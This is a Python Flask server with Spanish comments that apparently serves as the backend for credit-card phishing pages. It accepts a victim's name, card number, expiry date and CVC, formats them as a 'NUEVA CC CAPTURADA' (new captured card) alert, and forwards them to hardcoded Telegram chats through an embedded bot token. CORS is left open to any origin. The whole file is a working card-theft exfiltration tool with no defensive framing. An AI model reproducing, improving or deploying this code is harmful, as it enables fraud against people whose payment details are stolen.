import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# Permite que tus HTML hablen con el servidor sin bloqueos
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- DIVISIÓN DE DESTINATARIOS (SEGÚN TU PEDIDO) ---
# El bot usará estas listas para validar y clasificar
CLIENTES_PRIVADOS = ['6953415010', '7707049896'] 
GRUPOS_DESTINO = ['-1087968824', '1087968824']

# La lista maestra es la unión de ambos para la validación de seguridad
LISTA_MAESTRA_IDS = CLIENTES_PRIVADOS + GRUPOS_DESTINO

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    # El HTML manda la lista de IDs que quieres que reciban la CC
    lista_ids_html = data.get('lista_ids', [])
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    # Convertimos la lista maestra a strings para evitar errores de comparación
    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]

    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()

        # 1. VALIDACIÓN: ¿El ID que mandó el HTML está autorizado en mi servidor?
        if id_limpio in lista_maestra_strings:
            
            # 2. CLASIFICACIÓN (Para tus logs y control)
            if id_limpio in [str(i).strip() for i in GRUPOS_DESTINO]:
                print(f"📢 DESTINO: GRUPO ({id_limpio})")
            else:
                print(f"👤 DESTINO: CLIENTE PRIVADO ({id_limpio})")

            # 3. ENVÍO A TELEGRAM
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": id_limpio, "text": mensaje, "parse_mode": "Markdown"}
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ CC enviada con éxito a {id_limpio}")
                else:
                    print(f"❌ Error de Telegram para {id_limpio}: {res.text}")
            except Exception as e:
                print(f"❌ Error de red con {id_limpio}: {e}")
        else:
            print(f"🚫 ID NO AUTORIZADO (Ignorado): {id_limpio}")

    print(f"🏁 Proceso terminado. Enviados: {exitos}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
